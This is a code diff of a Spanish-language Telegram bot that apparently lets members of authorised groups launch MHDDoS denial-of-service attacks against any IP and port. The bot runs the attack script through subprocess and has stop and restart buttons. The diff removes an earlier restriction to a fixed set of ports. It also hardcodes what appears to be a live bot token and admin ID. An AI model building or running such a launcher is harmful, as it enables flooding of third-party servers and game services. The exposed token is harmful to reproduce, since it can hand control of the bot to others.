@@ -1,246 +1,133 @@
+# -*- coding: utf-8 -*-
 import telebot
+import subprocess
 import json
 import os
 import time
-import random
-import operator
-import threading
-import subprocess
 from threading import Lock, Thread, Timer
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TU_BOT_TOKEN"
-ADMIN_ID = TU_ADMIN_ID
-GROUP_LINK = "LINK_DE_TU_GRUPO"
+BOT_TOKEN = "7234938721:AAH6Z7qJWB744uCfIShF2tVDit7sGiDcNXM"
+ADMIN_ID = 6958414459
+GROUP_LINK = "https://t.me/crashgrupo"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
-ALLOWED_PORTS = [10010, 10011, 10012, 10013, 10014, 10015, 10016, 10017, 10018, 10019]
 
 bot = telebot.TeleBot(BOT_TOKEN)
 db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
-spam_cooldowns = {}
+spam_cooldowns = {}  # Diccionario para rastrear el tiempo de silencio por spam
 
+# Rutas de archivos JSON
 groups_file = "groups.json"
 users_file = "users.json"
-free_time_file = "free_time.json"
 
+# Verifica si el archivo de grupos existe, si no, lo crea
 if not os.path.exists(groups_file):
     with open(groups_file, "w") as f:
         json.dump({"groups": []}, f)
 
+# Verifica si el archivo de usuarios existe, si no, lo crea
 if not os.path.exists(users_file):
     with open(users_file, "w") as f:
         json.dump({"users": []}, f)
 
-if not os.path.exists(free_time_file):
-    with open(free_time_file, "w") as f:
-        json.dump({}, f)
-
-def load_json(file_path):
-    with open(file_path, "r") as f:
-        return json.load(f)
-
-def save_json(file_path, data):
-    with open(file_path, "w") as f:
-        json.dump(data, f)
+# Guardar tiempo de inicio del bot
+start_time = time.time()
 
 def load_groups():
-    return load_json(groups_file)["groups"]
+    """Carga los grupos desde el archivo JSON"""
+    with open(groups_file, "r") as f:
+        data = json.load(f)
+    return data["groups"]
 
 def save_groups(groups):
-    save_json(groups_file, {"groups": groups})
+    """Guarda los grupos en el archivo JSON"""
+    with open(groups_file, "w") as f:
+        json.dump({"groups": groups}, f)
 
 def load_users():
-    return load_json(users_file)["users"]
+    """Carga la lista de usuarios desde el archivo JSON."""
+    with open(users_file, "r") as f:
+        return json.load(f)["users"]
 
 def save_users(users):
-    save_json(users_file, {"users": users})
-
-def load_free_time():
-    return load_json(free_time_file)
-
-def save_free_time(data):
-    save_json(free_time_file, data)
+    """Guarda la lista de usuarios en el archivo JSON."""
+    with open(users_file, "w") as f:
+        json.dump({"users": users}, f)
 
 def add_user(user_id):
+    """Agrega un usuario a la lista si no está registrado."""
     users = load_users()
     if user_id not in users:
         users.append(user_id)
         save_users(users)
 
 def is_allowed(message):
+    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
     groups = load_groups()
-    user_id = message.from_user.id
-
-    if message.text.startswith("/register"):
+    if message.chat.id in groups or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
         return True
-
-    users = load_users()
-    if user_id not in users:
-        bot.reply_to(message, "❌ *Debes registrarte antes de usar este bot.*\nUsa el comando /register para registrarte.", parse_mode="Markdown")
-        return False
-
-    if message.chat.id in groups or (message.chat.type == "private" and user_id == ADMIN_ID):
-        return True
-
     bot.reply_to(message, f"❌ *¡Este bot solo funciona en los grupos autorizados!*\n🔗 Únete a nuestro grupo de *Free Fire* aquí: {GROUP_LINK}")
     return False
 
-def is_admin(message):
-    return message.from_user.id == ADMIN_ID or message.from_user.id in [admin.user.id for admin in bot.get_chat_administrators(message.chat.id)]
+def check_shutdown_time():
+    """Verifica el tiempo restante y notifica a los grupos cuando falten 5 minutos."""
+    while True:
+        elapsed_time = time.time() - start_time
+        remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos
 
-def generate_math_question(level):
-    ops = {
-        'easy': [(operator.add, '+'), (operator.sub, '-')],
-        'normal': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*')],
-        'hard': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*'), (operator.truediv, '/')]
-    }
+        if remaining_time <= 300:  # 5 minutos en segundos
+            groups = load_groups()
+            for group_id in groups:
+                try:
+                    bot.send_message(
+                        group_id,
+                        "⚠️ *Aviso Importante:*\n\n"
+                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
+                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
+                        "¡Gracias por su comprensión! 🙏",
+                        parse_mode="Markdown",
+                    )
+                except Exception as e:
+                    print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
 
-    op, symbol = random.choice(ops[level])
+            # Esperar a que el bot se apague
+            time.sleep(300)  # Esperar 5 minutos
+            break
 
-    if level == 'easy':
-        num1, num2 = random.randint(1, 10), random.randint(1, 10)
-    elif level == 'normal':
-        num1, num2 = random.randint(1, 50), random.randint(1, 50)
-    else:  # hard
-        num1, num2 = random.randint(1, 100), random.randint(1, 100)
+        time.sleep(60)  # Verificar cada minuto
 
-    if symbol == '/':
-        num2 = random.choice([i for i in range(1, 101) if num1 % i == 0])
+def notify_groups_bot_started():
+    """Notifica a los grupos que el bot ha sido encendido."""
+    groups = load_groups()
+    for group_id in groups:
+        try:
+            bot.send_message(
+                group_id,
+                "✅ *¡El bot ha sido reactivado!*\n\n"
+                "Ya puedes seguir utilizando todos los comandos disponibles.\n\n"
+                "¡Gracias por su paciencia! 💪",
+                parse_mode="Markdown",
+            )
+        except Exception as e:
+            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
 
-    question = f"¿Cuánto es {num1} {symbol} {num2}?"
-    answer = str(op(num1, num2))
+@bot.message_handler(commands=["start"])
+def handle_start(message):
+    add_user(message.chat.id)  # Asegura que el usuario quede registrado
 
-    return question, answer
+    markup = InlineKeyboardMarkup()
+    button = InlineKeyboardButton("💻 *SOPORTE - OFICIAL* 💻", url=f"tg://user?id={ADMIN_ID}")
+    markup.add(button)
 
-def timeout_handler(message, answer, user_id, level):
-    time.sleep(20)
-    bot.send_message(message.chat.id, "❌ *Tiempo agotado. ¡Inténtalo de nuevo!*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["trivia"])
-def handle_trivia(message):
-    try:
-        level = message.text.split()[1].lower()
-        if level not in ['easy', 'normal', 'hard']:
-            raise ValueError("Nivel no válido")
-
-        question, answer = generate_math_question(level)
-        user_id = message.from_user.id
-
-        bot.send_message(message.chat.id, f"🎮 *Pregunta de {level}:* {question}")
-
-        timer = threading.Thread(target=timeout_handler, args=(message, answer, user_id, level))
-        timer.start()
-
-        bot.register_next_step_handler(message, check_answer, answer, user_id, level, timer)
-
-    except Exception as e:
-        bot.send_message(message.chat.id, f"❌ *Error al iniciar la trivia: {str(e)}*", parse_mode="Markdown")
-
-def check_answer(message, correct_answer, user_id, level, timer):
-    if timer.is_alive():
-        timer.join()
-
-    if message.text.strip() == correct_answer:
-        bot.send_message(message.chat.id, "✅ *¡Respuesta correcta!*")
-
-        if level == "easy":
-            free_duration = 1
-        elif level == "normal":
-            free_duration = 3 
-        elif level == "hard":
-            free_duration = 24
-
-        free_time = load_free_time()
-        free_time[user_id] = time.time() + free_duration * 3600
-        save_free_time(free_time)
-        bot.send_message(message.chat.id, f"🎉 *¡Felicidades! Has ganado {free_duration} hora(s) de uso gratis del bot.*", parse_mode="Markdown")
-    else:
-        bot.send_message(message.chat.id, "❌ *Respuesta incorrecta. ¡Inténtalo de nuevo!*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["freetime"])
-def handle_freetime(message):
-    user_id = message.from_user.id
-    free_time = load_free_time()
-    if user_id in free_time:
-        remaining_time = free_time[user_id] - time.time()
-        if remaining_time > 0:
-            hours, remainder = divmod(remaining_time, 3600)
-            minutes = remainder // 60
-            bot.send_message(message.chat.id, f"🕒 *Tiempo gratis restante:* {int(hours)} horas y {int(minutes)} minutos.", parse_mode="Markdown")
-        else:
-            del free_time[user_id]
-            save_free_time(free_time)
-            bot.send_message(message.chat.id, "🕒 *Tu tiempo gratis ha expirado.*", parse_mode="Markdown")
-    else:
-        bot.send_message(message.chat.id, "🕒 *No tienes tiempo gratis disponible.*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["register"])
-def handle_register(message):
-    user_id = message.from_user.id
-    add_user(user_id)
-    bot.reply_to(message, f"✅ *¡Registrado correctamente!*\nTu ID de usuario es: `{user_id}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=["id"])
-def handle_id(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    if message.chat.type == "private":
-        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`", parse_mode="Markdown")
-    else:
-        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`\n*El ID del grupo es:* `{chat_id}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=["kick"])
-def handle_kick(message):
-    if not is_admin(message):
-        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
-        return
-
-    try:
-        user_id = int(message.text.split()[1])
-        bot.kick_chat_member(message.chat.id, user_id)
-        bot.reply_to(message, f"✅ *Usuario {user_id} expulsado del grupo.*", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error al expulsar al usuario: {str(e)}*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["ban"])
-def handle_ban(message):
-    if not is_admin(message):
-        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
-        return
-
-    try:
-        user_id = int(message.text.split()[1])
-        bot.ban_chat_member(message.chat.id, user_id)
-        bot.reply_to(message, f"✅ *Usuario {user_id} baneado del grupo.*", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error al banear al usuario: {str(e)}*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["mute"])
-def handle_mute(message):
-    if not is_admin(message):
-        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
-        return
-
-    try:
-        args = message.text.split()
-        user_id = int(args[1])
-        mute_time = int(args[2])
-        bot.restrict_chat_member(message.chat.id, user_id, until_date=time.time() + mute_time * 60)
-        bot.reply_to(message, f"✅ *Usuario {user_id} silenciado por {mute_time} minutos.*", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error al silenciar al usuario: {str(e)}*", parse_mode="Markdown")
-
-@bot.message_handler(commands=["math"])
-def handle_math(message):
-    try:
-        expression = message.text.replace("/math ", "")
-        result = eval(expression)
-        bot.reply_to(message, f"✅ *Resultado:* `{result}`", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error al evaluar la expresión: {str(e)}*", parse_mode="Markdown")
+    bot.send_message(
+        message.chat.id,
+        "🎮 *¡Bienvenido al Bot de Ping MHDDoS!* 🚀\n\n"
+        "🔧 Usa `/help` para ver los comandos disponibles.",
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
 
 @bot.message_handler(commands=["ping"])
 def handle_ping(message):
@@ -249,6 +136,7 @@ def handle_ping(message):
 
     telegram_id = message.from_user.id
 
+    # Verificar cooldown
     if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
         bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
         return
@@ -270,19 +158,10 @@ def handle_ping(message):
 
     attack_type = args[1]
     ip_port = args[2]
-    threads = int(args[3])
-    duration = int(args[4])
+    threads = int(args[3])  # Convertir a entero
+    duration = int(args[4])  # Convertir a entero
 
-    try:
-        ip, port = ip_port.split(":")
-        port = int(port)
-        if port not in ALLOWED_PORTS:
-            bot.reply_to(message, f"❌ *Puerto no permitido.* Solo se permiten los puertos: {ALLOWED_PORTS}")
-            return
-    except ValueError:
-        bot.reply_to(message, "❌ *Formato de IP:Puerto inválido.*")
-        return
-
+    # Validar límites
     if threads > 3:
         bot.reply_to(message, "❌ *El número máximo de hilos permitido es 3.*")
         return
@@ -297,7 +176,7 @@ def handle_ping(message):
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[telegram_id] = process
         cooldowns[telegram_id] = time.time()
-        cooldowns[f"last_command_{telegram_id}"] = message.text
+        cooldowns[f"last_command_{telegram_id}"] = message.text  # Guardar el último comando
 
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
@@ -339,6 +218,7 @@ def handle_stop_attack(call):
         try:
             bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
             
+            # Crear botón para realizar el ataque nuevamente
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🔄 Realizar ataque nuevamente", callback_data=f"restart_attack_{telegram_id}"))
 
@@ -351,6 +231,7 @@ def handle_stop_attack(call):
                 parse_mode="Markdown",
             )
 
+            # Programar la eliminación del mensaje después de 20 segundos
             Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
         except Exception as e:
             print(f"Error al responder a la consulta de callback o editar el mensaje: {str(e)}")
@@ -361,6 +242,7 @@ def handle_stop_attack(call):
             print(f"Error al responder a la consulta de callback: {str(e)}")
 
 def delete_message(chat_id, message_id):
+    """Elimina el mensaje después de 20 segundos."""
     try:
         bot.delete_message(chat_id, message_id)
     except Exception as e:
@@ -368,9 +250,9 @@ def delete_message(chat_id, message_id):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
 def handle_restart_attack(call):
-    telegram_id = int(call.data.split("_")[2])
+    telegram_id = int(call.data.split("_")[2])  # Extraer el ID del usuario que inició el ataque
 
-    if call.from_user.id != telegram_id:
+    if call.from_user.id != telegram_id:  # Verificar si el usuario que presionó el botón es el mismo que inició el ataque
         try:
             bot.answer_callback_query(
                 call.id, "❌ *Solo el usuario que inició el ataque puede repetirlo.*"
@@ -379,64 +261,73 @@ def handle_restart_attack(call):
             print(f"Error al responder a la consulta de callback: {str(e)}")
         return
 
+    # Verificar si el usuario está silenciado por spam
     if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
         bot.answer_callback_query(
             call.id, "❌ *Has hecho demasiadas solicitudes. Espera 1 minuto antes de intentar de nuevo.*"
         )
         return
 
-    last_command = cooldowns.get(f"last_command_{telegram_id}")
-    if not last_command:
+    # Verificar si el tiempo de espera para reiniciar el ataque ha expirado
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
+        # Obtener el último comando de ataque del usuario
+        last_command = cooldowns.get(f"last_command_{telegram_id}")
+        if not last_command:
+            try:
+                bot.answer_callback_query(call.id, "❌ *No hay un ataque previo para repetir.*")
+            except Exception as e:
+                print(f"Error al responder a la consulta de callback: {str(e)}")
+            return
+
+        # Ejecutar el último comando de ataque
         try:
-            bot.answer_callback_query(call.id, "❌ *No hay un ataque previo para repetir.*")
+            args = last_command.split()
+            attack_type = args[1]
+            ip_port = args[2]
+            threads = int(args[3])  # Convertir a entero
+            duration = int(args[4])  # Convertir a entero
+
+            # Validar límites
+            if threads > 1:
+                bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 1.*")
+                return
+
+            if duration > 480:
+                bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 480 segundos (8 minutos).*")
+                return
+
+            command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            active_attacks[telegram_id] = process
+            cooldowns[telegram_id] = time.time()  # Actualizar el cooldown
+
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
+
+            bot.edit_message_text(
+                "*🔥 ¡Ataque Reiniciado! 🔥*\n\n"
+                f"📍 *IP:* {ip_port}\n"
+                f"⚙️ *Tipo:* {attack_type}\n"
+                f"🧵 *Hilos:* {threads}\n"
+                f"⏳ *Duración:* {duration} segundos\n\n"
+                "*Este bot fue creado por @xFernandoh* 🎮",
+                chat_id=call.message.chat.id,
+                message_id=call.message.id,
+                reply_markup=markup,
+                parse_mode="Markdown",
+            )
+            bot.answer_callback_query(call.id, "✅ *Ataque reiniciado con éxito.*")
         except Exception as e:
-            print(f"Error al responder a la consulta de callback: {str(e)}")
-        return
+            bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")
 
-    try:
-        args = last_command.split()
-        attack_type = args[1]
-        ip_port = args[2]
-        threads = int(args[3])
-        duration = int(args[4])
-
-        if threads > 3:
-            bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 3.*")
-            return
-
-        if duration > 600:
-            bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 600 segundos (10 minutos).*")
-            return
-
-        command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]
-
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        active_attacks[telegram_id] = process
-        cooldowns[telegram_id] = time.time()
-
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
-
-        bot.edit_message_text(
-            "*🔥 ¡Ataque Reiniciado! 🔥*\n\n"
-            f"📍 *IP:* {ip_port}\n"
-            f"⚙️ *Tipo:* {attack_type}\n"
-            f"🧵 *Hilos:* {threads}\n"
-            f"⏳ *Duración:* {duration} segundos\n\n"
-            "*Este bot fue creado por @xFernandoh* 🎮",
-            chat_id=call.message.chat.id,
-            message_id=call.message.id,
-            reply_markup=markup,
-            parse_mode="Markdown",
-        )
-        bot.answer_callback_query(call.id, "✅ *Ataque reiniciado con éxito.*")
-    except Exception as e:
-        bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")
-
-    if telegram_id in spam_cooldowns:
-        spam_cooldowns[telegram_id] = time.time()
+        # Silenciar al usuario si hace spam
+        if telegram_id in spam_cooldowns:
+            spam_cooldowns[telegram_id] = time.time()
+        else:
+            spam_cooldowns[telegram_id] = time.time()
     else:
-        spam_cooldowns[telegram_id] = time.time()
+        bot.answer_callback_query(call.id, "❌ *El tiempo para reiniciar el ataque ha expirado.*")
 
 @bot.message_handler(commands=["addgroup"])
 def handle_addgroup(message):
@@ -445,13 +336,16 @@ def handle_addgroup(message):
         return
 
     try:
+        # Obtener ID del grupo
         group_id = int(message.text.split()[1])
         groups = load_groups()
 
+        # Verificar si el grupo ya está en la lista
         if group_id in groups:
             bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
             return
 
+        # Agregar el grupo y guardar
         groups.append(group_id)
         save_groups(groups)
 
@@ -475,13 +369,16 @@ def handle_removegroup(message):
         group_id = int(message.text.split()[1])
         groups = load_groups()
 
+        # Verificar si el grupo está en la lista
         if group_id not in groups:
             bot.reply_to(message, "❌ *Este grupo no está en la lista.*")
             return
 
+        # Eliminar el grupo y guardar
         groups.remove(group_id)
         save_groups(groups)
 
+        # El bot abandona el grupo
         bot.leave_chat(group_id)
 
         bot.reply_to(message, f"✅ *Bot eliminado correctamente del grupo {group_id}.*")
@@ -526,13 +423,7 @@ def handle_help(message):
             "5. `/help`: Muestra esta ayuda.\n"
             "6. `/timeactive`: Muestra el tiempo activo del bot y el tiempo restante antes de que se cierre.\n"
             "7. `/broadcast <mensaje>`: Envía un mensaje a todos los usuarios registrados (solo admin).\n"
-            "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n"
-            "9. `/trivia <nivel>`: Inicia un juego de trivia con preguntas de matemáticas.\n"
-            "10. `/math <expresión>`: Evalúa una expresión matemática.\n"
-            "11. `/kick <usuario>`: Expulsa a un usuario del grupo (solo admin).\n"
-            "12. `/ban <usuario>`: Prohíbe a un usuario en el grupo (solo admin).\n"
-            "13. `/mute <usuario> <tiempo>`: Silencia a un usuario por un período de tiempo (solo admin).\n"
-            "14. `/freetime`: Muestra el tiempo gratis restante.\n\n"
+            "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n\n"
             "¡Juega con responsabilidad y diviértete! 🎮"
         ),
         parse_mode="Markdown",
@@ -544,7 +435,7 @@ def handle_timeactive(message):
         return
 
     elapsed_time = time.time() - start_time
-    remaining_time = max(0, 140 * 60 - elapsed_time)
+    remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos
 
     elapsed_minutes = int(elapsed_time // 60)
     elapsed_seconds = int(elapsed_time % 60)
@@ -558,7 +449,7 @@ def handle_timeactive(message):
             f"🕒 *Tiempo activo del bot:*\n"
             f"✅ *Tiempo transcurrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
             f"⚠️ *Tiempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
-            "🚀 *Recuerda que el bot se cierra automáticamente después de 140 minutos.*"
+            "🚀 *Recuerda que Codespaces se cierra automáticamente después de 140 minutos.*"
         ),
         parse_mode="Markdown"
     )
@@ -579,7 +470,7 @@ def handle_broadcast(message):
 
     for user_id in users:
         try:
-            bot.send_message(user_id, f"📢 {text}", parse_mode="Markdown")
+            bot.send_message(user_id, f"📢  {text}", parse_mode="Markdown")
             success_count += 1
         except Exception as e:
             fail_count += 1
@@ -603,7 +494,7 @@ def handle_broadcastgroup(message):
 
     for group_id in groups:
         try:
-            bot.send_message(group_id, f"📢 {text}", parse_mode="Markdown")
+            bot.send_message(group_id, f"📢 *Mensaje del admin:* {text}", parse_mode="Markdown")
             success_count += 1
         except Exception as e:
             fail_count += 1
@@ -611,51 +502,14 @@ def handle_broadcastgroup(message):
 
     bot.reply_to(message, f"✅ Mensaje enviado a {success_count} grupos. ❌ Falló en {fail_count}.")
 
-def notify_groups_bot_started():
-    groups = load_groups()
-    for group_id in groups:
-        try:
-            bot.send_message(
-                group_id,
-                "✅ *¡El bot ha sido reactivado!*\n\n"
-                "Ya puedes seguir utilizando los comandos disponibles.\n\n"
-                "¡Gracias por su paciencia! 💪",
-                parse_mode="Markdown",
-            )
-        except Exception as e:
-            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
-
-def check_shutdown_time():
-    start_time = time.time()
-    while True:
-        elapsed_time = time.time() - start_time
-        remaining_time = max(0, 140 * 60 - elapsed_time)
-
-        if remaining_time <= 300:
-            groups = load_groups()
-            for group_id in groups:
-                try:
-                    bot.send_message(
-                        group_id,
-                        "⚠️ *Aviso Importante:*\n\n"
-                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
-                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
-                        "¡Gracias por su comprensión! 🙏",
-                        parse_mode="Markdown",
-                    )
-                except Exception as e:
-                    print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
-
-            time.sleep(300)
-            break
-
-        time.sleep(60)
-
 if __name__ == "__main__":
+    # Notificar a los grupos que el bot ha sido encendido
     notify_groups_bot_started()
 
-    shutdown_thread = threading.Thread(target=check_shutdown_time)
+    # Iniciar el hilo para verificar el tiempo de apagado
+    shutdown_thread = Thread(target=check_shutdown_time)
     shutdown_thread.daemon = True
     shutdown_thread.start()
 
+    # Iniciar el bot
     bot.infinity_polling()
